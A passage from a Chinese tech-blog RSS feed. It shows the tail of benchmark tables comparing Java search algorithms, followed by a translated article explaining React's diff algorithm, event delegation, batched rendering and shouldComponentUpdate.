&lt;/b&gt;&lt;b&gt;+Seq&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Interpolation&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Sampling&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Binary&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Gallop&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Gallop&lt;br&gt;
&lt;/b&gt;&lt;b&gt;+Binary&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10,000&lt;/td&gt;
&lt;td&gt;1.50E-04 ms&lt;/td&gt;
&lt;td&gt;1.60E-04 ms&lt;/td&gt;
&lt;td&gt;2.50E-04 ms&lt;/td&gt;
&lt;td&gt;3.20E-04 ms&lt;/td&gt;
&lt;td&gt;5.00E-05 ms&lt;/td&gt;
&lt;td&gt;1.50E-04 ms&lt;/td&gt;
&lt;td&gt;1.00E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20,000&lt;/td&gt;
&lt;td&gt;5.00E-05 ms&lt;/td&gt;
&lt;td&gt;5.50E-05 ms&lt;/td&gt;
&lt;td&gt;1.05E-04 ms&lt;/td&gt;
&lt;td&gt;2.35E-04 ms&lt;/td&gt;
&lt;td&gt;7.00E-05 ms&lt;/td&gt;
&lt;td&gt;1.15E-04 ms&lt;/td&gt;
&lt;td&gt;6.50E-05 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;40,000&lt;/td&gt;
&lt;td&gt;4.75E-05 ms&lt;/td&gt;
&lt;td&gt;5.00E-05 ms&lt;/td&gt;
&lt;td&gt;9.00E-05 ms&lt;/td&gt;
&lt;td&gt;1.30E-04 ms&lt;/td&gt;
&lt;td&gt;5.25E-05 ms&lt;/td&gt;
&lt;td&gt;1.33E-04 ms&lt;/td&gt;
&lt;td&gt;8.75E-05 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80,000&lt;/td&gt;
&lt;td&gt;4.88E-05 ms&lt;/td&gt;
&lt;td&gt;5.88E-05 ms&lt;/td&gt;
&lt;td&gt;9.88E-05 ms&lt;/td&gt;
&lt;td&gt;1.95E-04 ms&lt;/td&gt;
&lt;td&gt;6.38E-05 ms&lt;/td&gt;
&lt;td&gt;1.53E-04 ms&lt;/td&gt;
&lt;td&gt;9.00E-05 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;160,000&lt;/td&gt;
&lt;td&gt;5.25E-05 ms&lt;/td&gt;
&lt;td&gt;5.94E-05 ms&lt;/td&gt;
&lt;td&gt;1.01E-04 ms&lt;/td&gt;
&lt;td&gt;2.53E-04 ms&lt;/td&gt;
&lt;td&gt;6.56E-05 ms&lt;/td&gt;
&lt;td&gt;1.81E-04 ms&lt;/td&gt;
&lt;td&gt;9.38E-05 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;320,000&lt;/td&gt;
&lt;td&gt;5.16E-05 ms&lt;/td&gt;
&lt;td&gt;6.13E-05 ms&lt;/td&gt;
&lt;td&gt;1.22E-04 ms&lt;/td&gt;
&lt;td&gt;2.19E-04 ms&lt;/td&gt;
&lt;td&gt;6.31E-05 ms&lt;/td&gt;
&lt;td&gt;2.45E-04 ms&lt;/td&gt;
&lt;td&gt;1.04E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;640,000&lt;/td&gt;
&lt;td&gt;5.30E-05 ms&lt;/td&gt;
&lt;td&gt;6.06E-05 ms&lt;/td&gt;
&lt;td&gt;9.61E-05 ms&lt;/td&gt;
&lt;td&gt;2.12E-04 ms&lt;/td&gt;
&lt;td&gt;7.27E-05 ms&lt;/td&gt;
&lt;td&gt;2.31E-04 ms&lt;/td&gt;
&lt;td&gt;1.16E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1,280,000&lt;/td&gt;
&lt;td&gt;5.39E-05 ms&lt;/td&gt;
&lt;td&gt;6.06E-05 ms&lt;/td&gt;
&lt;td&gt;9.72E-05 ms&lt;/td&gt;
&lt;td&gt;2.59E-04 ms&lt;/td&gt;
&lt;td&gt;7.52E-05 ms&lt;/td&gt;
&lt;td&gt;2.72E-04 ms&lt;/td&gt;
&lt;td&gt;1.18E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2,560,000&lt;/td&gt;
&lt;td&gt;5.53E-05 ms&lt;/td&gt;
&lt;td&gt;6.40E-05 ms&lt;/td&gt;
&lt;td&gt;1.11E-04 ms&lt;/td&gt;
&lt;td&gt;2.57E-04 ms&lt;/td&gt;
&lt;td&gt;7.37E-05 ms&lt;/td&gt;
&lt;td&gt;2.75E-04 ms&lt;/td&gt;
&lt;td&gt;1.05E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5,120,000&lt;/td&gt;
&lt;td&gt;5.53E-05 ms&lt;/td&gt;
&lt;td&gt;6.30E-05 ms&lt;/td&gt;
&lt;td&gt;1.26E-04 ms&lt;/td&gt;
&lt;td&gt;2.69E-04 ms&lt;/td&gt;
&lt;td&gt;7.66E-05 ms&lt;/td&gt;
&lt;td&gt;3.32E-04 ms&lt;/td&gt;
&lt;td&gt;1.18E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10,240,000&lt;/td&gt;
&lt;td&gt;5.66E-05 ms&lt;/td&gt;
&lt;td&gt;6.59E-05 ms&lt;/td&gt;
&lt;td&gt;1.22E-04 ms&lt;/td&gt;
&lt;td&gt;2.92E-04 ms&lt;/td&gt;
&lt;td&gt;8.07E-05 ms&lt;/td&gt;
&lt;td&gt;4.27E-04 ms&lt;/td&gt;
&lt;td&gt;1.42E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20,480,000&lt;/td&gt;
&lt;td&gt;5.95E-05 ms&lt;/td&gt;
&lt;td&gt;6.54E-05 ms&lt;/td&gt;
&lt;td&gt;1.18E-04 ms&lt;/td&gt;
&lt;td&gt;3.50E-04 ms&lt;/td&gt;
&lt;td&gt;8.31E-05 ms&lt;/td&gt;
&lt;td&gt;4.88E-04 ms&lt;/td&gt;
&lt;td&gt;1.49E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;40,960,000&lt;/td&gt;
&lt;td&gt;5.87E-05 ms&lt;/td&gt;
&lt;td&gt;6.58E-05 ms&lt;/td&gt;
&lt;td&gt;1.15E-04 ms&lt;/td&gt;
&lt;td&gt;3.76E-04 ms&lt;/td&gt;
&lt;td&gt;8.59E-05 ms&lt;/td&gt;
&lt;td&gt;5.72E-04 ms&lt;/td&gt;
&lt;td&gt;1.75E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;81,920,000&lt;/td&gt;
&lt;td&gt;6.75E-05 ms&lt;/td&gt;
&lt;td&gt;6.83E-05 ms&lt;/td&gt;
&lt;td&gt;1.04E-04 ms&lt;/td&gt;
&lt;td&gt;3.86E-04 ms&lt;/td&gt;
&lt;td&gt;8.66E-05 ms&lt;/td&gt;
&lt;td&gt;6.89E-04 ms&lt;/td&gt;
&lt;td&gt;2.15E-04 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;原始数据 – 每个检索的平均比较次数&lt;/p&gt;
&lt;table border=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Size&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Arrays.&lt;br&gt;
&lt;/b&gt;&lt;b&gt;binarySearch&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Interpolation&lt;br&gt;
&lt;/b&gt;&lt;b&gt;+Seq&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Interpolation&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Sampling&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Binary&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Gallop&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Gallop&lt;br&gt;
&lt;/b&gt;&lt;b&gt;+Binary&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;10.6&lt;/td&gt;
&lt;td&gt;17.6&lt;/td&gt;
&lt;td&gt;19.0&lt;/td&gt;
&lt;td&gt;12.2&lt;/td&gt;
&lt;td&gt;58.2&lt;/td&gt;
&lt;td&gt;13.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;11.3&lt;/td&gt;
&lt;td&gt;20.7&lt;/td&gt;
&lt;td&gt;19.0&lt;/td&gt;
&lt;td&gt;13.2&lt;/td&gt;
&lt;td&gt;66.3&lt;/td&gt;
&lt;td&gt;14.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;40,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;11.0&lt;/td&gt;
&lt;td&gt;16.9&lt;/td&gt;
&lt;td&gt;20.9&lt;/td&gt;
&lt;td&gt;14.2&lt;/td&gt;
&lt;td&gt;74.9&lt;/td&gt;
&lt;td&gt;15.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.1&lt;/td&gt;
&lt;td&gt;19.9&lt;/td&gt;
&lt;td&gt;38.0&lt;/td&gt;
&lt;td&gt;15.2&lt;/td&gt;
&lt;td&gt;84.0&lt;/td&gt;
&lt;td&gt;16.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;160,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;11.7&lt;/td&gt;
&lt;td&gt;18.3&lt;/td&gt;
&lt;td&gt;38.0&lt;/td&gt;
&lt;td&gt;16.2&lt;/td&gt;
&lt;td&gt;93.6&lt;/td&gt;
&lt;td&gt;17.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;320,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.4&lt;/td&gt;
&lt;td&gt;25.3&lt;/td&gt;
&lt;td&gt;38.2&lt;/td&gt;
&lt;td&gt;17.2&lt;/td&gt;
&lt;td&gt;103.8&lt;/td&gt;
&lt;td&gt;18.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;640,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.4&lt;/td&gt;
&lt;td&gt;19.0&lt;/td&gt;
&lt;td&gt;41.6&lt;/td&gt;
&lt;td&gt;18.2&lt;/td&gt;
&lt;td&gt;114.4&lt;/td&gt;
&lt;td&gt;19.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1,280,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.5&lt;/td&gt;
&lt;td&gt;20.2&lt;/td&gt;
&lt;td&gt;57.0&lt;/td&gt;
&lt;td&gt;19.2&lt;/td&gt;
&lt;td&gt;125.5&lt;/td&gt;
&lt;td&gt;20.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2,560,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.8&lt;/td&gt;
&lt;td&gt;22.7&lt;/td&gt;
&lt;td&gt;57.0&lt;/td&gt;
&lt;td&gt;20.2&lt;/td&gt;
&lt;td&gt;137.1&lt;/td&gt;
&lt;td&gt;21.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5,120,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;12.7&lt;/td&gt;
&lt;td&gt;26.5&lt;/td&gt;
&lt;td&gt;57.5&lt;/td&gt;
&lt;td&gt;21.2&lt;/td&gt;
&lt;td&gt;149.2&lt;/td&gt;
&lt;td&gt;22.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10,240,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;13.2&lt;/td&gt;
&lt;td&gt;25.2&lt;/td&gt;
&lt;td&gt;62.1&lt;/td&gt;
&lt;td&gt;22.2&lt;/td&gt;
&lt;td&gt;161.8&lt;/td&gt;
&lt;td&gt;23.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20,480,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;13.4&lt;/td&gt;
&lt;td&gt;23.4&lt;/td&gt;
&lt;td&gt;76.0&lt;/td&gt;
&lt;td&gt;23.2&lt;/td&gt;
&lt;td&gt;175.0&lt;/td&gt;
&lt;td&gt;24.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;40,960,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;13.4&lt;/td&gt;
&lt;td&gt;21.9&lt;/td&gt;
&lt;td&gt;76.1&lt;/td&gt;
&lt;td&gt;24.2&lt;/td&gt;
&lt;td&gt;188.6&lt;/td&gt;
&lt;td&gt;25.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;81,920,000&lt;/td&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td&gt;14.0&lt;/td&gt;
&lt;td&gt;19.7&lt;/td&gt;
&lt;td&gt;77.0&lt;/td&gt;
&lt;td&gt;25.2&lt;/td&gt;
&lt;td&gt;202.7&lt;/td&gt;
&lt;td&gt;26.2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;源代码&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/adam-ho/misc/tree/master/searchPerformance/src/main/java/com/search&quot;&gt;点此获取检索算法的完整源代码&lt;/a&gt;。注意，代码不是产品级别的；比如，在某些例子里，可能有过多或过少的范围检查。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Sat, 19 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-19-73517-816d30f94.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-19-73517-816d30f94.html</guid>
        
        
      </item>
    
      <item>
        <title>React 的 diff 算法</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;&lt;a href=&quot;http://facebook.github.io/react/&quot; target=&quot;_blank&quot; rel=&quot;nofollow&quot;&gt;React&lt;/a&gt; 是 Facebook 开发的构建用户界面的类库。它从设计之初就将性能作为重点。这篇文章将展示 diff 算法和渲染过程怎样工作，你可以借鉴优化自己的应用。&lt;/p&gt;
&lt;h2&gt;Diff 算法&lt;/h2&gt;
&lt;p&gt;在深入实现的细节之前，需要了解一下 React 怎样工作的。&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;var MyComponent = React.createClass({
  render: function() {
    if (this.props.first) {
      return &amp;lt;div className=&quot;first&quot;&amp;gt;&amp;lt;span&amp;gt;A Span&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;;
    } else {
      return &amp;lt;div className=&quot;second&quot;&amp;gt;&amp;lt;p&amp;gt;A Paragraph&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;;
    }
  }
});&lt;/pre&gt;
&lt;p&gt;任何时间，你描述的是你的 UI 看起来是什么样子。需要特别注意，render 执行的结果得到的不是真正的 DOM 节点。结果仅仅是轻量级的 JavaScript 对象，我们称之为 virtual DOM。&lt;/p&gt;
&lt;p&gt;React 要从这个表现形式当中尝试找到前一个渲染结果到后一个的最小步数。比如，当我们挂载了 &lt;code&gt;&amp;lt;MyComponent first={true} /&amp;gt;&lt;/code&gt;，然后用 &lt;code&gt;&amp;lt;MyComponent first={false} /&amp;gt;&lt;/code&gt; 替换，然后又取消挂载，这样一个过程的 DOM 的指令是这样的:&lt;/p&gt;
&lt;p&gt;从没有到第一步&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建节点:
&lt;pre class=&quot;brush: html; gutter: true&quot;&gt;&amp;lt;div className=&quot;first&quot;&amp;gt;&amp;lt;span&amp;gt;A Span&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一步到第二步替换属性:?&lt;code&gt;className=&quot;first&quot; 到 className=&quot;second&quot;&lt;/code&gt;&lt;br&gt;
提盒节点:?&lt;code&gt;&amp;lt;span&amp;gt;A Span&amp;lt;/span&amp;gt;&lt;/code&gt;?到?&lt;code&gt;&amp;lt;p&amp;gt;A Paragraph&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第二步到没有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;删除节点:
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;&amp;lt;div className=&quot;second&quot;&amp;gt;&amp;lt;p&amp;gt;A Paragraph&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;按照层级&lt;/h4&gt;
&lt;p&gt;找到两课任意的树之间最小的修改是一个复杂度为 &lt;code&gt;O(n^3)&lt;/code&gt; 的问题。你可以想象，我们的例子里这不是容易处理的。React 用了一种简单但是强大的技巧，达到了接近 &lt;code&gt;O(n)&lt;/code&gt; 的复杂度。&lt;/p&gt;
&lt;p&gt;React 仅仅是尝试把树按照层级分解。 这彻底简化了复杂度，而且也不会失去很多，因为 Web 应用很少有 component 移动到树的另一个层级去。它们大部分只是在相邻的子节点之间移动。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/5353c5a8ae864b68bae903cb71e106ce.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73702&quot; alt=&quot;d1&quot; src=&quot;/images/jobbole.com/abe2c8e0d29baf5fc2084d7620a783a8.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;列表&lt;/h4&gt;
&lt;p&gt;假设我们有个 component，一个循环渲染了 5 个 component，随后又在列表中间插入一个新的 component。只知道这些信息，要弄清两个 component 的列表怎么对应很难。&lt;/p&gt;
&lt;p&gt;默认情况下，React 会将前一个列表第一个 component 和后一个第一个关联起来，后面也是。你可以写一个 &lt;code&gt;key&lt;/code&gt; 属性帮助 React 来处理它们之间的对应关系。世纪钟，在子元素中找到唯一的 key 通常很容易。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/18be24308734e65e462e74629de57c95.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73703&quot; alt=&quot;d2&quot; src=&quot;/images/jobbole.com/0b8617082291c2866018664f1cf02e23.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;Components&lt;/h4&gt;
&lt;p&gt;React app 通常由用户定义的 component 组合而成，通常结果是一个主要是很多 &lt;code&gt;div&lt;/code&gt; 组成的树。这个信息也被 React 的 diff 算法考虑进去，React 只会匹配相同 class 的 component。&lt;/p&gt;
&lt;p&gt;比如，如果有个 &lt;code&gt;&amp;lt;Header&amp;gt;&lt;/code&gt; 被 &lt;code&gt;&amp;lt;ExampleBlock&amp;gt;&lt;/code&gt; 替换掉了，React 会删除掉 header 再创建一个 example block。我们不需要化宝贵的时间去匹配两个不大可能又相似之处的 component。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/8016bb213a31681fefb1236e8d74f18b.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73704&quot; alt=&quot;d3&quot; src=&quot;/images/jobbole.com/6b5f8bea5a0ee0d68e5670754810a11e.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;事件代理&lt;/h2&gt;
&lt;p&gt;往 DOM 节点上绑事件慢得人心碎啊，而且很费内存。&lt;/p&gt;
&lt;p&gt;作为替代，React 部署了流行的技术，叫做”事件代理”。React 走得更远，重新实现了一遍符合 W3C 规范的事件系统。意味着 IE8 事件处理的 bug 成为过去了，所有时间名称跨浏览器保持一致。&lt;/p&gt;
&lt;p&gt;这里解释一下怎么实现的。 事件 listener 被绑定到整个文档的根节点上。当事件被触发，浏览器会给出一个出发的目标的 DOM 节点。为了在 DOM 的层级传播事件，React 不会迭代 virtual DOM 的层级。而是，我们依靠每个 React component 各自独立的 id 来编码这个层级。&lt;/p&gt;
&lt;p&gt;我们能通过简单的字符串操作来获取所有父级 component 的父级内容。把事件 listener 存储在 hash map 当中，我们发现性能比放到 virtual DOM 还要好。这个例子展示了，当一个事件广播到整个 virtual DOM 时发生什么。&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;// dispatchEvent(&#39;click&#39;，&#39;a.b.c&#39;，event)
clickCaptureListeners[&#39;a&#39;](event);
clickCaptureListeners[&#39;a.b&#39;](event);
clickCaptureListeners[&#39;a.b.c&#39;](event);
clickBubbleListeners[&#39;a.b.c&#39;](event);
clickBubbleListeners[&#39;a.b&#39;](event);
clickBubbleListeners[&#39;a&#39;](event);&lt;/pre&gt;
&lt;p&gt;浏览器为每个事件和每个 listener 创建一个新的事件对象。这个事件对象的属性很不错，你能获取到事件的引用，甚至修改掉。然而这也意味着高额的内存分配。&lt;/p&gt;
&lt;p&gt;React 在启动时就为那些对象分配了一个内存池。任何时候需要用到事件对象，就可以从这个内存池进行复用。这一点非常显著地减轻了垃圾回收的负担。&lt;/p&gt;
&lt;h2&gt;渲染&lt;/h2&gt;
&lt;h4&gt;批量化&lt;/h4&gt;
&lt;p&gt;你调用 component 的 &lt;code&gt;setState&lt;/code&gt; 方法的时候，React 将其标记为 dirty。到每一个事件循环结束，React 检查所有标记 dirty 的 component 重新绘制。&lt;/p&gt;
&lt;p&gt;这里的”批量化”是说，在一个事件循环当中，DOM 只会被更新一次。这个特性是构建高效的 app 的关键，而且用通常的 JavaScript 代码难以实现。而在 React 应用里，你默认就实现了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/7b7d59d08b4480b47a5b480a91f3f199.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73705&quot; alt=&quot;d4&quot; src=&quot;/images/jobbole.com/f62a4c9f0c9c2808037d1dfadc28dbe6.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h4&gt;子树渲染&lt;/h4&gt;
&lt;p&gt;调用 &lt;code&gt;setState&lt;/code&gt; 方法时，component 重新构建包括了子节点的 virtual DOM。如果你在根节点调用 &lt;code&gt;setState&lt;/code&gt;，整个 React 的应用都会被重新渲染。所有的 component，即便没有更新，都会调用他们的 &lt;code&gt;render&lt;/code&gt; 方法。这个听起来可怕，性能像是很低，但实际上我们不会触碰真实的 DOM，运行起来没问题。&lt;/p&gt;
&lt;p&gt;首先，我们讨论的是展示用户界面. 因为屏幕空间有限，通常你需要一次渲染成败上千条指令。JavaScript 对于能处理的整个界面，在业务逻辑上已经足够快了。&lt;/p&gt;
&lt;p&gt;另一点，在写 React 代码时，每当又数据更新，你不是都调用根节点的 &lt;code&gt;setState&lt;/code&gt;。你会在需要接收对应更新的 component 上调用，或者在上面的几个 component。你很少要一直到根节点上. 就是说更新只出现在用户产生交互的局部.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/0c946ae9ee9fffc1a8d180d618568698.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73706&quot; alt=&quot;d5&quot; src=&quot;/images/jobbole.com/c4de89fa3336f20696c0e31bae8d59f0.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h4&gt;选择性子树渲染&lt;/h4&gt;
&lt;p&gt;最后，你还有可能截断一些子树的重新渲染。如果你在 component 上实现以下方法的话：&lt;/p&gt;
&lt;pre class=&quot;brush: actionscript3; gutter: true&quot;&gt;boolean shouldComponentUpdate(object nextProps， object nextState)&lt;/pre&gt;
&lt;p&gt;根据 component 的前一个和下一个 &lt;code&gt;props/state&lt;/code&gt;，你可以告诉 React 这个 component 没有更新，也不需要重新绘制。实现得好的话，可以带来巨大的性能提升。&lt;/p&gt;
&lt;p&gt;要用这个方法，你要能够对 JavaScript Object 进行比对。这件有很多细节的因素，比如对比应该是深度的还是浅层的，如果要深的，我们是用不可变数据结构，还是进行深度拷贝。&lt;/p&gt;
&lt;p&gt;而且你要注意，真个函数每次都会被调用，所以你要确保运行起来花的事件更少，比 React 的技巧，还有比渲染 component 需要的时间，即便重新绘制并不是必要的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/78334626370247b9ea8ed249b37a7196.png&quot; rel=&quot;lightbox[73701]&quot; title=&quot;React 的 diff 算法&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73707&quot; alt=&quot;d6&quot; src=&quot;/images/jobbole.com/cd4c0dbd39755d85f843c53ed45572e7.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;结论&lt;/h2&gt;
&lt;p&gt;帮助 React 变快的技术并不新颖。 长久以来，我们到知道触碰 DOM 是费时的，你应该合并处理读和写的操作，事件代理会更快。&lt;/p&gt;
&lt;p&gt;人们还是会经常讨论他们，因为在实际当中用 JavaScript 进行实现很是挺难的。React 突出的一个原因是这些优化默认就启动了。这就让你避免掉不小心把 app 写得很慢。&lt;/p&gt;
&lt;p&gt;React 消耗性能的模型很简单，很好理解: 每次调用 &lt;code&gt;setState&lt;/code&gt; 会重新计算整个子树。如果你想要提高性能，尽量少调用 &lt;code&gt;setState&lt;/code&gt;，还有用 &lt;code&gt;shouldComponentUpdate&lt;/code&gt; 减少大的子树的重新计算。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Thu, 17 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-17-73701-418acf0a6.html</link>
